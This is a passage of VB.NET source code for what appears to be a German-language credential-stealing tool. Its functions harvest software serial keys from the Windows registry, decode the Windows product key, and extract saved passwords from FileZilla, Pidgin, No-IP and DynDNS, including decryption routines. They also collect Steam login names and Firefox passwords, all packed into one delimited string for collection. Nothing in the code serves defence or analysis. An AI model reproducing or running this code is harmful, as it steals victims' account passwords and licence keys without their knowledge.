            daten = daten & "CD-/Serialkey;:;" & "SILENT HUNTER III;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Ubisoft\SILENT HUNTER III\Keys", "DiscKey_SH3", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Electronic Arts\Maxis\ Sim City 4 Deluxe", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Sim City 4 Deluxe;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Electronic Arts\Maxis\ Sim City 4 Deluxe", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Electronic Arts\Maxis\ Sim City 4", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & " Sim City 4;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Electronic Arts\Maxis\ Sim City 4", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Network Associates, Inc.\Sniffer Pro\4.5\USER", "SerialNumber", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Sniffer Pro;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Network Associates, Inc.\Sniffer Pro\4.5\USER", "SerialNumber", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Silver Style Entertainment\Soldiers Of Anarchy", "Settings", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Soldiers Of Anarchy;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Silver Style Entertainment\Soldiers Of Anarchy", "Settings", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Silver Style Entertainment\Soldiers Of Anarchy", "Settings", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Soldiers Of Anarchy;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Silver Style Entertainment\Soldiers Of Anarchy", "Settings", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\GSC Game World\STALKER-SHOC", "InstallCDKEY", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Stalker - Shadow of Chernobyl;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\GSC Game World\STALKER-SHOC", "InstallCDKEY", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\LucasArts\Star Wars Battlefront II\1.0", "CD Key", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Star Wars Battlefront II;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\LucasArts\Star Wars Battlefront II\1.0", "CD Key", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\LucasArts\Star Wars Battlefront II\1.1", "CD Key", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\LucasArts\Star Wars Battlefront II\1.1", "CD Key", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Steganos\SIAVPN", "ClientID", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Steganos Internet Anonym VPN;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Steganos\SIAVPN", "ClientID", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Steganos\SIAVPN", "ClientID", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Splinter Cell Pandora Tomorrow;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Steganos\SIAVPN", "ClientID", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\THQ\Gas Powered Games\Supreme Commander", "KEY", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Supreme Commander;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\THQ\Gas Powered Games\Supreme Commander", "KEY", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Sierra\CDKey", "swat2", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Sierra;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Sierra\CDKey", "swat2", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Sierra\CDKey", "swat3", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "swat3;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Sierra\CDKey", "swat3", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Sierra\CDKey", "swat4", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "swat4;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Sierra\CDKey", "swat4", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\TechSmith\SnagIt\8", "RegisteredTo", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "TechSmith SnagIt;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\TechSmith\SnagIt\8", "RegisteredTo", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\TechSmith\SnagIt\8", "RegistrationKey", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "TechSmith SnagIt;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\TechSmith\SnagIt\8", "RegistrationKey", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\TechSmith\SnagIt\8", "RegistrationKey", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "TechSmith SnagIt;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\TechSmith\SnagIt\8", "RegistrationKey", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\TexasCalc\License", "Owner Name", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Texas Calculatem 4;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\TexasCalc\License", "Owner Name", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\TexasCalc\License", "Registration Key", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Texas Calculatem 4;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\TexasCalc\License", "Registration Key", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Electronic Arts\EA Games\The Battle for Middle-earth", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "The Battle for Middle-earth;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Electronic Arts\EA Games\The Battle for Middle-earth", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Electronic Arts\EA Games\The Orange Box", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "The Orange Box;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Electronic Arts\EA Games\The Orange Box", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Sierra\CDKey", "Timeshift", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Timeshift;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Sierra\CDKey", "Timeshift", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Pegasys Inc.\TMPGEnc DVD Author\1.0", "RegistrationCode", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "TMPGEnc DVD Author;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Pegasys Inc.\TMPGEnc DVD Author\1.0", "RegistrationCode", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\TuneUp\Utilities\6.0", "UserName", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "TuneUp\Utilities\6.0;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\TuneUp\Utilities\6.0", "UserName", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\TuneUp\Utilities\6.0", "RegCode", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "TuneUp\Utilities\6.0;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\TuneUp\Utilities\6.0", "RegCode", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\TuneUp\Utilities\6.0", "Company", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "TuneUp\Utilities\6.0;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\TuneUp\Utilities\6.0", "Company", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\TuneUp\Utilities\7.0", "UserName", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "TuneUp\Utilities\7.0;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\TuneUp\Utilities\7.0", "UserName", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\TuneUp\Utilities\7.0", "RegCode", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "TuneUp\Utilities\7.0;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\TuneUp\Utilities\7.0", "RegCode", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\TuneUp\Utilities\7.0", "Company", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Utilities\7.0;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\TuneUp\Utilities\7.0", "Company", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\TuneUp\Utilities\8.0", "UserName", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "TuneUp\Utilities\8.0;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\TuneUp\Utilities\8.0", "UserName", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\TuneUp\Utilities\8.0", "ProductKey", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "TuneUp\Utilities\8.0;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\TuneUp\Utilities\8.0", "ProductKey", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\TuneUp\Utilities\8.0", "Company", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "TuneUp\Utilities\8.0;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\TuneUp\Utilities\8.0", "Company", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Nullsoft\Winamp", "regname", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Winamp (Username);:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Nullsoft\Winamp", "regname", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Nullsoft\Winamp", "regkey", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Winamp (Serial);:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Nullsoft\Winamp", "regkey", Nothing) & ";:;;:;~+~"
        End If
        daten = daten & "CD-/Serialkey;:;Windows Produktschlüssel;:;" & GetProductKey() & ";:;;:;~+~"


        Return daten
    End Function
    Public Function FileZilla_Stealen() As String
        'If IO.File.Exists(Environ("appdata") & "\FileZilla\recentservers.xml") Then
        '    senden("4Keine FileZilla Passwörter gefunden.")
        'End If
        Dim daten As String = Nothing
        Dim array() As String
        Dim array2() As String
        Dim i As Integer = 0
        Dim warheit As Boolean = True

        Try
            array = Split(My.Computer.FileSystem.ReadAllText((Environ("appdata") & "\FileZilla\recentservers.xml")), vbNewLine)
            'daten = "recentservers:"
            For Each logs As String In array
                If logs.Contains("<Host>") Then
                    daten &= "FileZilla;:;" & Split(logs.Replace("</Host>", ""), ">")(1)
                End If
                If logs.Contains("<User>") Then
                    daten &= ";:;" & Split(logs.Replace("</User>", ""), ">")(1)
                End If
                If logs.Contains("<Pass>") Then
                    daten &= ";:;" & Split(logs.Replace("</Pass>", ""), ">")(1) & "~+~"
                End If

            Next logs
        Catch ex As Exception
        End Try
        'daten &= vbNewLine & vbNewLine & "sitemanager:" & vbNewLine
        Try
            array2 = Split(My.Computer.FileSystem.ReadAllText((Environ("appdata") & "\FileZilla\sitemanager.xml")), vbNewLine)
            For Each logs As String In array2

                If logs.Contains("<Host>") Then
                    daten &= "FileZilla;:;" & Split(logs.Replace("</Host>", ""), ">")(1)
                End If
                If logs.Contains("<User>") Then
                    daten &= ";:;" & Split(logs.Replace("</User>", ""), ">")(1)
                End If
                If logs.Contains("<Pass>") Then
                    daten &= ";:;" & Split(logs.Replace("</Pass>", ""), ">")(1) & "~+~"
                End If
            Next logs
        Catch ex As Exception

        End Try
        Return daten
    End Function
    Public Function NO_IP_Stealen() As String
        Dim daten As String = Nothing
        Try
            daten = "NoIP"
            daten &= My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Vitalwerks\DUC\", "Username", Nothing) & ";:;"
            daten &= FromBase64(My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Vitalwerks\DUC\", "Password", Nothing)) & ";:;~+~"
        Catch ex As Exception
            Return Nothing
        End Try
        Return daten
    End Function
    Private Function FromBase64(ByVal sText As String) As String
        Dim nBytes() As Byte = System.Convert.FromBase64String(sText)
        Return System.Text.Encoding.Default.GetString(nBytes)
    End Function
    Public Function PidginStealen() As String
        On Error Resume Next
        Dim pfad As String = Environ("appdata") & "\.purple\accounts.xml"
        Dim returner As String = Nothing
        For Each zeile As String In Split(IO.File.ReadAllText(pfad), vbNewLine)
            If zeile.Contains("<protocol>prpl") Then
                returner &= "Pidgin;:;" & Split(Split(zeile, "<protocol>")(1), "</protocol>")(0) & ";:;"
            End If
            If zeile.Contains("<name>") Then
                returner &= Split(Split(zeile, "<name>")(1), "</name>")(0) & ";:;"
            End If
            If zeile.Contains("<password>") Then
                returner &= Split(Split(zeile, "<password>")(1), "</password>")(0) & ";:;~+~"
            End If
        Next
        Return returner & vbNewLine & vbNewLine
    End Function
    Public Function SteamUserNamenStealen()
        On Error Resume Next
        Dim rText As String = Nothing
        Dim di As New IO.DirectoryInfo(Environ("programfiles") & "\Steam\Steamapps")
        For Each SteamName As IO.DirectoryInfo In di.GetDirectories
            If SteamName.Name <> "sourcemods" Then
                rText &= "Steam Loginname;:;" & SteamName.Name & ";:;-;:;~+~"
            End If
        Next
        Return rText
    End Function
    Public Function dyndns_stealen() As String
        On Error Resume Next
        Dim rueckgabe As String = "DynDNS;:;" & vbNewLine
        Dim pfad As String = Nothing
        'pfad = Environ("ALLUSERSPROFILE") & "\" & Split(Environ("appdata"), "\")(Split(Environ("appdata"), "\").Count - 1) & "\DynDNS\Updater\config.dyndns"
        If IO.File.Exists(pfad) = False Then
            pfad = Environ("ALLUSERSPROFILE") & "\DynDNS\Updater\config.dyndns"
        End If
        Dim zeilen() As String = Split(My.Computer.FileSystem.ReadAllText(pfad), vbNewLine)
        For Each zeile As String In zeilen
            If zeile.Contains("Username") Then
                rueckgabe &= Split(zeile, "Username=")(1) & ";:;"
            End If
            If zeile.Contains("Password") Then
                rueckgabe &= dyn_dns_PW_Decrypt(Split(zeile, "Password=")(1)) & ";:;~+~"
            End If
        Next
        Return rueckgabe & vbNewLine
    End Function
    Private Function dyn_dns_PW_Decrypt(ByVal passwort As String) As String
        Dim lPtr As Long
        Dim sChars As String = Nothing
        Dim sPassword As String = passwort
        For i = 1 To Len(sPassword) Step 2
            sChars = sChars & Chr(Val("&H" & Mid$(sPassword, i, 2)))
        Next i

        For i = 1 To Len(sChars)
            Mid(sChars, i, 1) = Chr((Asc(Mid(sChars, i, 1))) Xor (Asc(Mid("t6KzXhCh", lPtr + 1, 1))))
            lPtr = ((lPtr + 1) Mod 8)
        Next i
        Return sChars
    End Function
    Public Function GetFireFoxPWs()
        Return ff.sFirefox
    End Function
    Public Function GetProductKey() As String
        Try
            Dim HexBuf As Object = Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "DigitalProductId", 0)
            If HexBuf Is Nothing Then Return "N/A"

            Dim tmp As String = ""

            For l As Integer = LBound(HexBuf) To UBound(HexBuf)
                tmp = tmp & " " & Hex(HexBuf(l))
            Next

            Dim StartOffset As Integer = 52
            Dim EndOffset As Integer = 67
            Dim Digits(24) As String

            Digits(0) = "B" : Digits(1) = "C" : Digits(2) = "D" : Digits(3) = "F"
            Digits(4) = "G" : Digits(5) = "H" : Digits(6) = "J" : Digits(7) = "K"
            Digits(8) = "M" : Digits(9) = "P" : Digits(10) = "Q" : Digits(11) = "R"
            Digits(12) = "T" : Digits(13) = "V" : Digits(14) = "W" : Digits(15) = "X"
            Digits(16) = "Y" : Digits(17) = "2" : Digits(18) = "3" : Digits(19) = "4"
            Digits(20) = "6" : Digits(21) = "7" : Digits(22) = "8" : Digits(23) = "9"

            Dim dLen As Integer = 29
            Dim sLen As Integer = 15
            Dim HexDigitalPID(15) As String
            Dim Des(30) As String

            Dim tmp2 As String = ""

            For i = StartOffset To EndOffset
                HexDigitalPID(i - StartOffset) = HexBuf(i)
                tmp2 = tmp2 & " " & Hex(HexDigitalPID(i - StartOffset))
            Next

            Dim KEYSTRING As String = ""

            For i As Integer = dLen - 1 To 0 Step -1
                If ((i + 1) Mod 6) = 0 Then
                    Des(i) = "-"
                    KEYSTRING = KEYSTRING & "-"
                Else
                    Dim HN As Integer = 0
                    For N As Integer = (sLen - 1) To 0 Step -1
                        Dim Value As Integer = ((HN * 2 ^ 8) Or HexDigitalPID(N))
                        HexDigitalPID(N) = Value \ 24
                        HN = (Value Mod 24)

                    Next

                    Des(i) = Digits(HN)
                    KEYSTRING = KEYSTRING & Digits(HN)
                End If
            Next

            Return StrReverse(KEYSTRING)
        Catch
            Return ""
        End Try
    End Function
End Class
